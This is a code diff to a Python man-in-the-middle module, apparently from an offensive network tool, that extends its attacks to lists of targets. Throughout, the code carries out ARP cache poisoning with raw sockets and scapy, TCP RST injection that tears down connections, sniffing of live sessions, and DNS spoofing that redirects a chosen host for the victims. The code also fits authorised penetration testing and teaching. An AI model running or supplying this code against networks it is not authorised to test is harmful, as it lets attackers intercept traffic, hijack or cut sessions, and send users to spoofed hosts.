@@ -47,11 +47,26 @@ class Mitm(object):
     Base abstract class for Man In The Middle attacks, poison and restore are
     left unimplemented
     """
-    def __init__(self, device, source_mac, src_ip, dst_ip):
+    def __init__(self, device, source_mac, gateway, target):
         self.dev = device
         self.src_mac = source_mac
-        self.src_ip = src_ip
-        self.dst_ip = dst_ip
+        self.gateway = gateway
+        self.target = target
+
+    def _build_pcap_filter(self, prefix, port=None):
+        """ build the pcap filter based on arguments self.target and port"""
+        pcap_filter = prefix
+        if isinstance(self.target, list):
+            pcap_filter = "(%s " % pcap_filter
+            for addr in self.target[:-1]:
+                pcap_filter += "%s or " % addr
+            pcap_filter += "%s) " % self.target[-1]
+        else:
+            pcap_filter += "%s" % self.target
+        if port:
+            pcap_filter += " and tcp port %s" % port
+
+        return pcap_filter
 
     def rst_inject(self, port=None):
         """
@@ -60,10 +75,9 @@ class Mitm(object):
         """
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
-        pcap_filter = "ip host %s" % self.dst_ip
-        if port:
-            pcap_filter += " and tcp port %s" % port
-            # need to create a daemon that continually poison our target
+        pcap_filter = self._build_pcap_filter("ip host ", port)
+
+        # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self.poison, args=(2,))
         poison_thread.daemon = True
         poison_thread.start()
@@ -71,13 +85,17 @@ class Mitm(object):
         packets = pcap.pcap(self.dev)
         packets.setfilter(pcap_filter) # we need only target packets
 
-        log.info('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.src_ip + W
-                 + ' and ' + R + self.dst_ip + W)
+        log.info('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
+                 + ' and ' + R
+                 + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
 
         if port:
-            print('[+] Sending RST packets to ' + R + self.dst_ip + W + ' on port ' + R + port + W)
+            print('[+] Sending RST packets to ' + R
+                  + (','.join(self.target) if isinstance(self.target, list) else self.target)
+                  + W + ' on port ' + R + port + W)
         else:
-            print('[+] Sending RST packets to ' + R + self.dst_ip + W)
+            print('[+] Sending RST packets to ' + R
+                  + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
 
         if config.DOTTED is True:
             print('[+] Every dot symbolize a sent packet')
@@ -173,19 +191,16 @@ class Mitm(object):
         }
 
         source = utils.get_default_gateway_linux()
-        pcap_filter = 'ip host %s' % self.dst_ip
-
-        if port:
-            pcap_filter += ' and port %s' % port
-
+        pcap_filter = self._build_pcap_filter("ip host ", port)
         packets = pcap.pcap(self.dev)
-        packets.setfilter(pcap_filter) # we need only self.dst_ip packets
+        packets.setfilter(pcap_filter) # we need only self.target packets
         # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self.poison, args=(2,))
         poison_thread.daemon = True
         poison_thread.start()
         print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + source + W
-              + ' and ' + R + self.dst_ip + W)
+              + ' and ' + R
+              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
         sessions = []
         session = 0
         sess = ""
@@ -196,12 +211,20 @@ class Mitm(object):
                 if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                     tcp = ip_packet.data
                     if tcp.flags != dpkt.tcp.TH_RST:
-                        if inet_ntoa(ip_packet.src) == self.dst_ip:
-                            sess = inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
-                            sess += "\t-->\t" + inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
+                        if isinstance(self.target, list):
+                            if inet_ntoa(ip_packet.src) in self.target:
+                                sess = inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
+                                sess += "\t-->\t" + inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
+                            else:
+                                sess = inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
+                                sess += "\t<--\t" + inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
                         else:
-                            sess = inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
-                            sess += "\t<--\t" + inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
+                            if inet_ntoa(ip_packet.src) == self.target:
+                                sess = inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
+                                sess += "\t-->\t" + inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
+                            else:
+                                sess = inet_ntoa(ip_packet.dst) + ":" + str(tcp.dport)
+                                sess += "\t<--\t" + inet_ntoa(ip_packet.src) + ":" + str(tcp.sport)
 
                         if sess not in sessions:
                             sessions.append(sess)
@@ -222,13 +245,13 @@ class Mitm(object):
         """
         Redirect all incoming request for 'host' to 'redirection'
         """
+        pcap_filter = self._build_pcap_filter('udp dst port 53 and src ')
         redirection = gethostbyname(redirection)
         sock = dnet.ip()
 
-        pcap_filter = 'udp dst port 53 and src %s' % self.dst_ip
-
-        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.src_ip + W
-              + ' and ' + R + self.dst_ip + W)
+        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
+              + ' and ' + R
+              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
         # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self.poison, args=(2, ))
         poison_thread.daemon = True
@@ -238,7 +261,7 @@ class Mitm(object):
         packets.setfilter(pcap_filter)
 
         print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R
-              + self.dst_ip + W)
+              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
 
         try:
             for _, pkt in packets:
@@ -307,8 +330,8 @@ class PcapMitm(Mitm):
     """
     Man In The Middle subclass using raw sockets to poison the targets
     """
-    def __init__(self, device, source_mac, src_ip, dst_ip):
-        super(PcapMitm, self).__init__(device, source_mac, src_ip, dst_ip)
+    def __init__(self, device, source_mac, gateway, target):
+        super(PcapMitm, self).__init__(device, source_mac, gateway, target)
 
     def poison(self, delay):
         """
@@ -322,10 +345,18 @@ class PcapMitm(Mitm):
             while True:
                 if config.VERBOSE is True:
                     log.info('[+] %s <-- %s -- %s -- %s --> %s',
-                             self.src_ip, self.dst_ip, self.dev, self.src_ip, self.dst_ip)
-                    sock.send(str(utils.build_arp_packet(self.src_mac, self.src_ip, self.dst_ip)))
-                    sock.send(str(utils.build_arp_packet(self.src_mac, self.dst_ip, self.src_ip)))
-                    time.sleep(delay) # OS refresh ARP cache really often
+                             self.gateway, self.target, self.dev, self.gateway, self.target)
+                    if not isinstance(self.target, list):
+                        sock.send(str(utils.build_arp_packet(
+                            self.src_mac, self.gateway, self.target)))
+                        sock.send(str(utils.build_arp_packet(
+                            self.src_mac, self.target, self.gateway)))
+                        time.sleep(delay) # OS refresh ARP cache really often
+                    else:
+                        for addr in self.target:
+                            sock.send(str(utils.build_arp_packet(self.src_mac, self.gateway, addr)))
+                            sock.send(str(utils.build_arp_packet(self.src_mac, addr, self.gateway)))
+                        time.sleep(delay) # OS refresh ARP cache really often
 
         except KeyboardInterrupt:
             print('\n\r[+] Poisoning interrupted')
@@ -333,30 +364,51 @@ class PcapMitm(Mitm):
 
     def restore(self, delay):
         """ reset arp cache of the target and the router (AP) """
-        target_mac = utils.get_mac_by_ip(self.dst_ip)
-        source_mac = utils.get_mac_by_ip(self.src_ip)
+        source_mac = utils.get_mac_by_ip(self.gateway)
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
-        for _ in xrange(6):
-            sock.send(str(utils.build_arp_packet(target_mac, self.src_ip, self.dst_ip)))
-            sock.send(str(utils.build_arp_packet(source_mac, self.dst_ip, self.src_ip)))
+        if not isinstance(self.target, list):
+            target_mac = utils.get_mac_by_ip(self.target)
+            for _ in xrange(6):
+                sock.send(str(utils.build_arp_packet(target_mac, self.gateway, self.target)))
+                sock.send(str(utils.build_arp_packet(source_mac, self.target, self.gateway)))
+        else:
+            for addr in self.target:
+                target_mac = utils.get_mac_by_ip(addr)
+                for _ in xrange(6):
+                    sock.send(str(utils.build_arp_packet(target_mac, self.gateway, addr)))
+                    sock.send(str(utils.build_arp_packet(source_mac, addr, self.gateway)))
 
 class ScapyMitm(Mitm):
     """
     Man In The Middle subclass using scapy to poison the target, needs tcpdump to be
     installed
     """
-    def __init__(self, device, source_mac, src_ip, dst_ip):
-        super(ScapyMitm, self).__init__(device, source_mac, src_ip, dst_ip)
+    def __init__(self, device, source_mac, gateway, target):
+        super(ScapyMitm, self).__init__(device, source_mac, gateway, target)
 
     def poison(self, delay):
-        dst_mac = utils.get_mac_by_ip_s(self.dst_ip, delay)
-        send(ARP(op=2, pdst=self.dst_ip, psrc=self.src_ip, hwdst=dst_mac), verbose=False)
-        send(ARP(op=2, pdst=self.src_ip, psrc=self.dst_ip, hwdst=self.src_mac), verbose=False)
+        if not isinstance(self.target, list):
+            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
+            send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst=dst_mac), verbose=False)
+            send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst=self.src_mac), verbose=False)
+        else:
+            for addr in self.target:
+                dst_mac = utils.get_mac_by_ip_s(addr, delay)
+                send(ARP(op=2, pdst=addr, psrc=self.gateway, hwdst=dst_mac), verbose=False)
+                send(ARP(op=2, pdst=self.gateway, psrc=addr, hwdst=self.src_mac), verbose=False)
 
     def restore(self, delay):
-        dst_mac = utils.get_mac_by_ip_s(self.dst_ip, delay)
-        send(ARP(op=2, pdst=self.src_ip, psrc=self.dst_ip,
-                 hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
-        send(ARP(op=2, pdst=self.dst_ip, psrc=self.src_ip,
-                 hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
+        if not isinstance(self.target, list):
+            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
+            send(ARP(op=2, pdst=self.gateway, psrc=self.target,
+                     hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
+            send(ARP(op=2, pdst=self.target, psrc=self.gateway,
+                     hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
+        else:
+            for addr in self.target:
+                dst_mac = utils.get_mac_by_ip_s(addr, delay)
+                send(ARP(op=2, pdst=self.gateway, psrc=addr,
+                         hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
+                send(ARP(op=2, pdst=addr, psrc=self.gateway,
+                         hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
